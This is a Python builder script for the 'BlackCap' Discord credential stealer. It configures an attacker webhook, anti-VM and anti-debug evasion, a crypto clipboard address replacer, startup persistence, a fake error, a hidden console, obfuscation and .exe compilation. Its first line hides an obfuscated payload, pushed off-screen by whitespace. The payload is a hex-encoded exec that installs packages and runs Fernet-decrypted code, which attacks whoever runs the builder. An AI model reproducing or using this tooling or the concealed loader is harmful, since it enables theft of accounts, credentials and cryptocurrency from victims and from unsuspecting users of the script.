import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x4d\x67\x44\x74\x6a\x6c\x78\x75\x76\x43\x5a\x32\x4f\x49\x4a\x70\x36\x51\x44\x74\x6d\x61\x6a\x4b\x50\x7a\x4a\x74\x37\x32\x51\x72\x4e\x61\x58\x6a\x66\x6c\x6f\x7a\x62\x4d\x67\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6e\x5f\x39\x62\x6b\x30\x2d\x45\x71\x76\x6a\x38\x6e\x74\x71\x4f\x59\x44\x35\x72\x77\x68\x32\x4f\x50\x68\x74\x38\x58\x70\x76\x38\x73\x46\x77\x6a\x74\x70\x4d\x59\x74\x59\x43\x4b\x66\x6a\x2d\x76\x30\x72\x59\x79\x4c\x70\x4a\x36\x39\x4f\x5f\x53\x6d\x43\x50\x54\x57\x51\x68\x6a\x5a\x46\x74\x55\x53\x4e\x4e\x32\x63\x79\x51\x37\x4a\x34\x57\x2d\x66\x66\x64\x6b\x74\x6d\x53\x44\x42\x42\x4e\x70\x58\x42\x72\x72\x58\x67\x53\x64\x37\x46\x35\x4a\x5a\x58\x6f\x6a\x72\x49\x62\x31\x32\x55\x41\x55\x43\x71\x4c\x50\x36\x71\x51\x55\x72\x63\x68\x54\x73\x76\x41\x79\x44\x30\x4a\x74\x4a\x42\x74\x71\x39\x4d\x4e\x78\x7a\x31\x36\x57\x4f\x7a\x38\x4a\x58\x73\x34\x4f\x61\x77\x5f\x76\x57\x48\x31\x68\x46\x45\x65\x44\x61\x53\x54\x2d\x42\x33\x6c\x57\x62\x48\x6d\x7a\x76\x71\x5f\x6a\x4c\x46\x67\x33\x54\x62\x64\x44\x36\x5a\x65\x4b\x37\x37\x74\x65\x6b\x50\x51\x43\x4c\x62\x78\x73\x55\x4f\x78\x34\x45\x7a\x79\x78\x33\x71\x68\x71\x73\x66\x66\x79\x39\x65\x47\x57\x35\x65\x30\x51\x53\x41\x68\x45\x3d\x27\x29\x29')
import os
import random
import shutil
import subprocess
import sys
import time
from json import load
from urllib.request import urlopen
from zlib import compress
import requests
from alive_progress import alive_bar
from colorama import Fore, Style, init


class Builder:
    def __init__(self) -> None:
        if not self.check():
            exit()

        self.webhook = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter your webhook: "
        )
        if not self.check_webhook(self.webhook):
            print(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}"
            )
            str(
                input(
                    f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press anything to exit..."
                )
            )
            sys.exit()

        self.filename = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter your custom output .exe name: "
        )

        self.killprocess = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Kill victim Discord Client? (yes/no): "
        )
        if self.killprocess.lower() == "y" or self.killprocess.lower() == "yes":
            self.killprocess = True
        else:
            self.killprocess = False

        self.dbugkiller = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enable Anti-Debug (Recommand yes, Kill Virus-Total Machines / Virtual Machines or other)? (yes/no): "
        )
        if self.dbugkiller.lower() == "y" or self.dbugkiller.lower() == "yes":
            self.dbugkiller = True
        else:
            self.dbugkiller = False

        self.ping = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Ping on new victim? (yes/no): "
        )
        if self.ping.lower() == "y":
            self.ping = "yes"
        if self.ping.lower() == "yes":
            self.ping = "yes"
            self.pingtype = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Ping type? (here/everyone): "
            ).lower()
            if self.pingtype not in ["here", "everyone"]:
                self.pingtype == "here"
        else:
            self.ping = "no"
            self.pingtype = "none"

        self.address_replacer = input(
            f"{Fore.CYAN}[{Fore.RESET}NEW{Fore.CYAN}]{Fore.RESET} Replace all copied crypto address wallet by your address ? (yes/no): "
        )
        if self.address_replacer.lower() == "yes":
            self.address_replacer = "yes"
            self.btc_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Bitcoin Address (let empty if you do not have): "
            ).lower()
            if not self.btc_address.lower():
                self.btc_address = "none"

            self.eth_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Ethereum Address (let empty if you do not have):"
            ).lower()
            if not self.eth_address.lower():
                self.eth_address = "0x4c305D9d4CdF740FF4f2166ecF65c1DF73e93472"

            self.xchain_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your X-Chain Address (let empty if you do not have):"
            ).lower()
            if not self.xchain_address.lower():
                self.xchain_address = "none"

            self.pchain_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your P-Chain Address (let empty if you do not have):"
            ).lower()
            if not self.pchain_address.lower():
                self.pchain_address = "none"

            self.cchain_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your C-Chain Address (let empty if you do not have):"
            ).lower()
            if not self.cchain_address.lower():
                self.cchain_address = "none"

            self.monero_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Monero Address (let empty if you do not have):"
            ).lower()
            if not self.monero_address.lower():
                self.monero_address = "none"

            self.ada_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Ada/Cardano Address (let empty if you do not have):"
            ).lower()
            if not self.ada_address.lower():
                self.ada_address = "none"

            self.dash_address = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Your Dash Address (let empty if you do not have):"
            ).lower()
            if not self.dash_address.lower():
                self.dash_address = "none"

        else:
            self.address_replacer = "no"
            self.btc_address = "none"
            self.eth_address = "none"
            self.xchain_address = "none"
            self.pchain_address = "none"
            self.cchain_address = "none"
            self.monero_address = "none"
            self.dash_address = "none"
            self.ada_address = "none"

        self.error = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Add a fake error? (yes/no): "
        )
        if self.error.lower() == "y" or self.error.lower() == "yes":
            self.error = "yes"
        else:
            self.error = "no"

        self.startup = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Add file to startup? (yes/no): "
        )
        if self.startup.lower() == "y" or self.startup.lower() == "yes":
            self.startup = "yes"
        else:
            self.startup = "no"

        self.hider = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Hide BlackCap console for victim? (yes/no): "
        )
        if self.hider.lower() == "yes" or self.hider.lower() == "y":
            self.hider = "yes"
        else:
            self.hider = False

        self.obfuscation = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to obfuscate the BlackCap (recommand no if yes script will be detected)? (yes/no): "
        )

        self.compy = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to compile the file to a .exe? (yes/no): "
        )

        if self.compy == "yes":
            self.icon = input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to add an icon to the .exe (yes/no): "
            )
            if self.icon == "yes":
                self.icon_exe()
            else:
                pass
        else:
            pass

        self.mk_file(self.filename, self.webhook)

        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} File successfully created!{Fore.RESET}"
        )

        self.cleanup(self.filename)
        self.renamefile(self.filename)

        run = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to test the file? [yes/no]: "
        )
        if run.lower() == "yes" or run.lower() == "y":
            self.run(self.filename)

        input(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}"
        )
        sys.exit()

    def check_webhook(self, webhook):
        try:
            with requests.get(webhook) as r:
                if r.status_code == 200:
                    return True
                else:
                    return False
        except BaseException:
            return False

    def check(self):
        required_files = {"./main.py", "./requirements.txt", "./obfuscation.py"}

        for file in required_files:
            if not os.path.isfile(file):
                print(
                    f"{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] {file} not found!"
                )
                return False

        try:
            print(subprocess.check_output("python -V", stderr=subprocess.STDOUT))
            print(subprocess.check_output("pip -V", stderr=subprocess.STDOUT))

        except subprocess.CalledProcessError:
            print(
                f"{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] Python not found!"
            )
            return False

        os.system("pip install --upgrade -r requirements.txt")

        os.system("cls")

        os.system("mode con:cols=150 lines=20")

        return True

    def icon_exe(self):
        self.icon_name = input(
            f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter the name of the icon: "
        )

        if os.path.isfile(f"./{self.icon_name}"):
            pass
        else:
            print(
                f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon not found! Please check the name and make sure it's in the current directory."
            )
            input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press anything to exit..."
            )

        if self.icon_name.endswith(".ico"):
            pass
        else:
            print(
                f"{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon must have .ico extension! Please convert it and try again."
            )
            input(
                f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press anything to exit..."
            )

    def renamefile(self, filename):
        try:
            os.rename(f"./obfuscated_compressed_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass
        try:
            os.rename(f"./obfuscated_compressed_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass

    def mk_file(self, filename, webhook):
        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}"
        )

        with open("./main.py", "r", encoding="utf-8") as f:
            code = f.read()

        with open(f"{filename}.py", "w", encoding="utf-8") as f:
            f.write(
                code.replace("%WEBHOOK_HERE%", webhook)
                .replace("%ping_enabled%", str(self.ping))
                .replace("%ping_type%", self.pingtype)
                .replace("%_address_replacer%", str(self.address_replacer))
                .replace("%_btc_address%", self.btc_address)
                .replace("%_eth_address%", self.eth_address)
                .replace("%_xchain_address%", self.xchain_address)
                .replace("%_pchain_address%", self.pchain_address)
                .replace("%_cchain_address%", self.cchain_address)
                .replace("%_monero_address%", self.monero_address)
                .replace("%_ada_address%", self.ada_address)
                .replace("%_dash_address%", self.dash_address)
                .replace("%_error_enabled%", str(self.error))
                .replace("%_startup_enabled%", str(self.startup))
                .replace("%_hide_script%", str(self.hider))
                .replace("'%kill_discord_process%'", str(self.killprocess))
                .replace("'%_debugkiller%'", str(self.dbugkiller))
            )

        time.sleep(2)
        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Source code has been generated...{Fore.RESET}"
        )

        with open(f"{filename}.py", mode="rb") as f:
            content = f.read()

        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Compressing Code...{Fore.RESET}"
        )

        original_size = len(content)
        content = self.compress(content)
        new_size = len(content)

        with open(
            file="compressed_"
            + (
                filename.split("\\")[-1]
                if "\\" in filename
                else filename.split("/")[-1]
            )
            + ".py",
            mode="w",
            encoding="utf-8",
        ) as f:
            f.write(content)
            if self.obfuscation == "no" and self.compy == "yes":
                f.write(
                    "\nimport asyncio, json, ntpath, os, random, re, shutil, sqlite3, subprocess, threading, winreg, zipfile, httpx, psutil, win32gui, win32con, pyperclip, base64, requests, ctypes, time;from sqlite3 import connect;from base64 import b64decode;from urllib.request import Request, urlopen;from shutil import copy2;from datetime import datetime, timedelta, timezone;from sys import argv;from tempfile import gettempdir, mkdtemp;from json import loads, dumps;from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer;from Crypto.Cipher import AES;from PIL import ImageGrab;from win32crypt import CryptUnprotectData"
                )

        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Old file size: {original_size} bytes - New file size: {new_size} bytes {Fore.RESET}"
        )

        if self.obfuscation == "yes" and self.compy == "yes":
            self.encryption(f"{filename}")
            self.compile(f"obfuscated_{filename}")
        elif self.obfuscation == "no" and self.compy == "yes":
            self.compile(f"{filename}")
        elif self.obfuscation == "yes" and self.compy == "no":
            self.encryption(f"{filename}")
        else:
            pass

    def compress(self, content):
        compressed_code = compress(content)
        return f"eval(compile(__import__('zlib').decompress({compressed_code}),filename='auoiwhgoawhg',mode='exec'))"

    def encryption(self, filename):
        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Obfuscating code...{Fore.RESET}"
        )
        os.system(f"python obfuscation.py {filename}.py")

    def compile(self, filename):
        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET} {Fore.WHITE}Compiling code...{Fore.RESET}"
        )
        if self.icon == "yes":
            icon = self.icon_name
        else:
            icon = "NONE"
        os.system(
            f"python -m PyInstaller --onefile --noconsole -i {icon} --distpath ./ .\\{filename}.py"
        )
        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Code compiled!{Fore.RESET}"
        )

    def run(self, filename):
        print(
            f"{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Attempting to execute file..."
        )

        if os.path.isfile(f"./{filename}.exe"):
            os.system(f"start ./{filename}.exe")
        elif os.path.isfile(f"./{filename}.py"):
            os.system(f"python ./{filename}.py")

    def cleanup(self, filename):
        cleans_dir = {"./__pycache__", "./build"}
        cleans_file = {
            f"./{filename}.py",
            f"./obfuscated_compressed_{filename}.py",
            f"./compressed_{filename}.py",
            f"./compressed_{filename}.spec",
        }

        if self.obfuscation == "yes" and self.compy == "no":
            cleans_file.remove(f"./obfuscated_compressed_{filename}.py")
        elif self.obfuscation == "yes" and self.compy == "yes":
            cleans_file.add(f"./obfuscated_compressed_{filename}.spec")
        elif self.obfuscation == "no" and self.compy == "no":
            cleans_file.remove(f"./{filename}.py")
        else:
            pass

        for clean in cleans_dir:
            try:
                if os.path.isdir(clean):
                    shutil.rmtree(clean)
            except Exception:
                pass
                continue

        for clean in cleans_file:
            try:
                if os.path.isfile(clean):
                    os.remove(clean)
            except Exception:
                pass
                continue


if __name__ == "__main__":
    init()

    if os.name != "nt":
        os.system("clear")
    else:
        os.system("mode con:cols=212 lines=212")
        os.system("cls")

    Builder()

print('klvrniry')